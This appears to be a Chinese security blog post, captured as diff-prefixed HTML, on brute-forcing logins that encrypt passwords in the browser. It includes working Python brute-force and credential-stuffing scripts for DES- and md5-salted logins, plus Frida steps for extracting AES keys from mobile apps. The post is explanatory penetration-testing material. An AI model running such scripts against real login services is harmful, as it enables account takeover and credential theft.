class="string">'232cb851727762bbf7dd097da3bcd354'</span>);</span><br><span class="line">		alert(post_key);</span><br><span class="line">		post(post_key)</span><br><span class="line">	&#125;</span><br><span class="line"><span class="number">232</span>cb851727762bbf7dd097da3bcd354</span><br><span class="line">encryptByDES(<span class="string">'&#123;"username":"admin","password":"admin"&#125;'</span>,<span class="string">'232cb85*************cd354'</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz0flwi7w9j20fg042q3a.jpg" alt></p>
+<p><strong>python des加密模块--pydes</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">Des_Key= <span class="string">"12345678"</span> <span class="comment">#Key</span></span><br><span class="line">Des_IV= <span class="string">""</span> <span class="comment">#自定IV向量</span></span><br><span class="line">defDesEncrypt(str):</span><br><span class="line">   k= des(Des_Key, CBC, Des_IV, pad=<span class="literal">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">   EncryptStr= k.encrypt(str)</span><br><span class="line">   returnbase64.b64encode(EncryptStr) <span class="comment">#转base64编码返回</span></span><br></pre></td></tr></table></figure>
+
+<p>这个模块只有des的ECB和CBC模式加密，并且填充方式只有pkcs5padding，和nomalpadding两种</p>
+<p>正常des加密key固定是8位的，3des加密是16或者24位的</p>
+<p><strong>python调用JS--execjs</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def get_js():	<span class="comment">//这个是获取js的函数</span></span><br><span class="line">  f= open(<span class="string">'C:\\des.js'</span>,<span class="string">'r'</span>)</span><br><span class="line">  line = f.readline()</span><br><span class="line">   htmlstr = <span class="string">''</span></span><br><span class="line">  <span class="keyword">while</span> line:</span><br><span class="line">      htmlstr = htmlstr+line</span><br><span class="line">      line = f.readline()</span><br><span class="line">  <span class="keyword">return</span> htmlstr</span><br></pre></td></tr></table></figure>
+
+<p>这个是加密的函数。先获取js然后解析js代码再调用js的函数并传参就可以返回加密的密码了。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def DesEncrypt(str,key):	<span class="comment">//这个是des加密的函数</span></span><br><span class="line">  jsstr= get_js()	<span class="comment">//获取js</span></span><br><span class="line">  ctx= execjs.compile(jsstr)	<span class="comment">//解析js代码</span></span><br><span class="line">     password=ctx.call(<span class="string">'encryptByDES'</span>,str,key)	<span class="comment">//调用encryptByDES函数，并传参原文str和加密key</span></span><br><span class="line"> password=(password.encode(<span class="string">"unicode_escape"</span>).decode(<span class="string">"string_escape"</span>)).decode(<span class="string">'unicode-escape'</span>).encode(<span class="string">'utf-8'</span>)	<span class="comment">//解码，解出来是unicode的</span></span><br><span class="line">  <span class="keyword">return</span> password</span><br></pre></td></tr></table></figure>
+
+<p>知道明文key和密文解密：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz0gwxmzf4j20vc0bvjru.jpg" alt></p>
+<p>网上找的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> execjs,requests</span><br><span class="line">Des_Key = <span class="string">'232cb851727762bbf7dd097da3bcd354'</span> <span class="comment"># Key  通过查看源码或者其他方式找到</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_js</span><span class="params">()</span>:</span></span><br><span class="line">    f = open(<span class="string">'F:\\Website\\phpstudy\\PHPTutorial\\WWW\\des\\main_total.js'</span>, <span class="string">'r'</span>)</span><br><span class="line">    line = f.readline()</span><br><span class="line">    htmlstr = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> line:</span><br><span class="line">        htmlstr = htmlstr+line</span><br><span class="line">        line = f.readline()</span><br><span class="line">    <span class="keyword">return</span> htmlstr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span><span class="params">(str,key)</span>:</span></span><br><span class="line"></span><br><span class="line">    jsstr = get_js()</span><br><span class="line">    ctx = execjs.compile(jsstr)</span><br><span class="line">    password=ctx.call(<span class="string">'encryptByDES'</span>,str,key)</span><br><span class="line">    password=(password.encode(<span class="string">"unicode_escape"</span>).decode(<span class="string">"string_escape"</span>)).decode(<span class="string">'unicode-escape'</span>).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span><span class="params">(user)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> passwordDict:</span><br><span class="line">        <span class="comment"># keyword='12345678'</span></span><br><span class="line"></span><br><span class="line">        encPWd = <span class="string">'&#123;"username":"%s","password":"%s"&#125;'</span>%(user,keyword)</span><br><span class="line">        psw=DesEncrypt(encPWd,Des_Key)</span><br><span class="line">        <span class="keyword">print</span> str(psw)</span><br><span class="line">        head = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>,</span><br><span class="line">                <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">                <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">                <span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">                <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">                <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">        postdata=&#123;<span class="string">'login_key'</span>:psw&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(<span class="string">'http://127.0.0.1/des/test.php'</span>,headers=head,data=postdata)</span><br><span class="line">            res=(r.text.encode(<span class="string">"unicode_escape"</span>).decode(<span class="string">"string_escape"</span>))</span><br><span class="line">            <span class="comment"># print res</span></span><br><span class="line">            <span class="comment"># print type(res)</span></span><br><span class="line">            i<span class="string">f'重新'</span> <span class="keyword">in</span> res:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"trying +"</span>+encPWd</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> res</span><br><span class="line">                exit(<span class="string">'%s:%s  成功?'</span>%(user,keyword))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    user = [ <span class="string">'admin'</span>,<span class="string">'root'</span>]</span><br><span class="line">    <span class="comment"># user='admin'</span></span><br><span class="line">    pool = Pool(<span class="number">2</span>)</span><br><span class="line">    pool.map(bruteforce,user)</span><br><span class="line">    <span class="comment"># bruteforce(user,password,head)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    passwordDict = open(<span class="string">"C:\\Users\\49974\\Desktop\\psw.txt"</span>).read().splitlines()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-AES的爆破"><a href="#0x03-AES的爆破" class="headerlink" title="0x03 AES的爆破"></a>0x03 AES的爆破</h1><p><strong>AES-Killer</strong></p>
+<h2 id="1-如何安装"><a href="#1-如何安装" class="headerlink" title="1. 如何安装"></a>1. 如何安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从Release下载jar文件并添加burpsuite</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://camo.githubusercontent.com/487022ebfa1149750f2153a90da04c019328ce6b/68747470733a2f2f692e696d6775722e636f6d2f364453303467622e676966" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/487022ebfa1149750f2153a90da04c019328ce6b/68747470733a2f2f692e696d6775722e636f6d2f364453303467622e676966" alt="img"></a></p>
+<h2 id="2-原始请求-响应"><a href="#2-原始请求-响应" class="headerlink" title="2. 原始请求/响应"></a>2. 原始请求/响应</h2><p><a href="https://camo.githubusercontent.com/1eb5be1a9aad66e5c3a2d0236960e3f07af70e94/68747470733a2f2f692e696d6775722e636f6d2f6f637a6e4850612e676966" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/1eb5be1a9aad66e5c3a2d0236960e3f07af70e94/68747470733a2f2f692e696d6775722e636f6d2f6f637a6e4850612e676966" alt="img"></a></p>
+<h2 id="3-获取AES加密密钥和IV"><a href="#3-获取AES加密密钥和IV" class="headerlink" title="3.获取AES加密密钥和IV"></a>3.获取AES加密密钥和IV</h2><ul>
+<li>首先在<a href="https://www.frida.re/docs/ios/" target="_blank" rel="noopener">IOS</a>和<a href="https://www.frida.re/docs/android/" target="_blank" rel="noopener">Android</a>设备上设置frida服务器。</li>
+<li>在移动设备上启动应用程序</li>
+<li>在主机上运行此<a href="https://gist.github.com/d3vilbug/41deacfe52a476d68d6f21587c5f531d" target="_blank" rel="noopener">frida脚本</a>以获取AES加密密钥和IV。</li>
+</ul>
+<p><a href="https://camo.githubusercontent.com/311e0d4bb60a5f9f5c5d98a9ca95fc6d2e0c8c33/68747470733a2f2f692e696d6775722e636f6d2f4e4f4c6c5163792e676966" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/311e0d4bb60a5f9f5c5d98a9ca95fc6d2e0c8c33/68747470733a2f2f692e696d6775722e636f6d2f4e4f4c6c5163792e676966" alt="img"></a></p>
+<p><strong>ios下</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line">frida-ls-devices	//USB连接 列出设备</span><br><span class="line">python frida-get-AES-keys.py</span><br><span class="line">frida-ps -U		//查看进程</span><br><span class="line">frida -U 微信</span><br><span class="line">frida-trace -i &quot;open&quot; -U 微信		//frida-trace</span><br><span class="line">python frida-get-AES-keys.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz1avidhcfj20dw064q35.jpg" alt></p>
+<h2 id="4-解密请求-响应"><a href="#4-解密请求-响应" class="headerlink" title="4. 解密请求/响应"></a>4. 解密请求/响应</h2><ul>
+<li>在<code>Secret Key</code>字段下提供SecretSpecKey</li>
+<li>在<code>Initialize Vector</code>现场提供IV</li>
+<li>提供主机/ URL以过滤加密和解密的请求和响应</li>
+<li>按 <code>Start AES Killer</code></li>
+</ul>
+<p><a href="https://camo.githubusercontent.com/f9f75b6fd8636c46352cea9dbdf3517f6de43899/68747470733a2f2f692e696d6775722e636f6d2f4579756b7868732e676966" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/f9f75b6fd8636c46352cea9dbdf3517f6de43899/68747470733a2f2f692e696d6775722e636f6d2f4579756b7868732e676966" alt="img"></a></p>
+<h1 id="0x04-md5加密"><a href="#0x04-md5加密" class="headerlink" title="0x04 md5加密"></a>0x04 md5加密</h1><p>用户名密码在本地进行了md5加密处理。因此，撞库之前需要本地实现将字典进行加密操作后再提交。</p>
+<p>对登录功能抓包分析后，可以看到在填写用户名密码后，前端发送如下数据包获取cd、salt数据包：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2uviam1mj21o60bqjzn.jpg" alt>](<a href="https://image.3001.net/images/20180914/1536903440_5b9b49102a441.png" target="_blank" rel="noopener">https://image.3001.net/images/20180914/1536903440_5b9b49102a441.png</a>)</p>
+<p>此处存在salt泄漏风险，可遍历手机号，对于未注册⽤用户，返回值⽆salt，对于已注册⽤户salt值恒定。</p>
+<p>而实施撞库，需要先请求得到salt与cd值。然后可从前端代码中得到加密用户名密码过程：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2uvufc9bj21o80kedp2.jpg" alt></p>
+<p>pass经过本地md5加密后， 发送至服务端进行登录校验。</p>
+<p><strong>演习：</strong></p>
+<p>因此，我们只需要用脚本，先输入用户名即手机号，请求得到cd、salt值，然后再从密码字典中，取出密码进行md5加密，最后发包请求即可。编写python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetPass</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">"./pass.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> fp == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"open file error!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">line = fp.readline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">passwd = line.strip(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">Brute_Force_Dididai(<span class="string">"150****1403"</span>,passwd);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Brute_Force_Dididai</span><span class="params">(username,password)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url = ""</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">s.headers = &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/51.0.2704.103 Safari/537.36'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://www.foo.com/?m=&amp;s=getcd"</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"username"</span>:username&#125;</span><br><span class="line"></span><br><span class="line">html = s.post(url,data = data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> html.content</span><br><span class="line"></span><br><span class="line">salt_cd = json.loads(html.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> salt_cd[<span class="string">'salt'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> salt_cd[<span class="string">'cd'</span>]</span><br><span class="line"></span><br><span class="line">md5_pass = hashlib.md5(password.encode(<span class="string">'utf-8'</span>)).hexdigest()+salt_cd[<span class="string">'salt'</span>]</span><br><span class="line"></span><br><span class="line">md5_salt = hashlib.md5(md5_pass.encode(<span class="string">'utf-8'</span>)).hexdigest()+str(salt_cd[<span class="string">'cd'</span>])</span><br><span class="line"></span><br><span class="line">md5_cd = hashlib.md5(md5_salt.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> md5_cd</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://www.foo.com/?m=&amp;s=login_wd&amp;ismd5=1"</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;<span class="string">"username"</span>:<span class="string">"username"</span>,<span class="string">"password"</span>:md5_cd&#125;</span><br><span class="line"></span><br><span class="line">html1 = s.post(url1,data = data1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> html1.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(html1.content);</span><br><span class="line"></span><br><span class="line">GetPass()</span><br></pre></td></tr></table></figure>
+
+<p>Reference：</p>
+<p><a href="https://github.com/matt-wu/AES" target="_blank" rel="noopener">https://github.com/matt-wu/AES</a></p>
+<p><a href="https://github.com/Ebryx/AES-Killer" target="_blank" rel="noopener">AES-Killer</a></p>
+<p><a href="https://blog.csdn.net/aa2397199142/article/details/50844879/" target="_blank" rel="noopener">https://blog.csdn.net/aa2397199142/article/details/50844879/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/09/2019-1-9-加密与解密/" title="加密方式">https://wh0ale.github.io/2019/01/09/2019-1-9-加密与解密/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/加密与解密/" rel="tag"><i class="fa fa-tag"></i># 加密与解密</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/07/2019-1-7-BypassWaf_sql/" rel="next" title="BypassWaf_sql">
+                <i class="fa fa-chevron-left"></i> BypassWaf_sql
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/10/2019-1-10-邮件服务器/" rel="prev" title="邮件服务器getshell">
+                邮件服务器getshell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-jsDES的爆破"><span class="nav-number">2.</span> <span class="nav-text">0x02 jsDES的爆破</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-AES的爆破"><span class="nav-number">3.</span> <span class="nav-text">0x03 AES的爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-如何安装"><span class="nav-number">3.1.</span> <span class="nav-text">1. 如何安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-原始请求-响应"><span class="nav-number">3.2.</span> <span class="nav-text">2. 原始请求/响应</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-获取AES加密密钥和IV"><span class="nav-number">3.3.</span> <span class="nav-text">3.获取AES加密密钥和IV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-解密请求-响应"><span class="nav-number">3.4.</span> <span class="nav-text">4. 解密请求/响应</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-md5加密"><span class="nav-number">4.</span> <span class="nav-text">0x04 md5加密</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
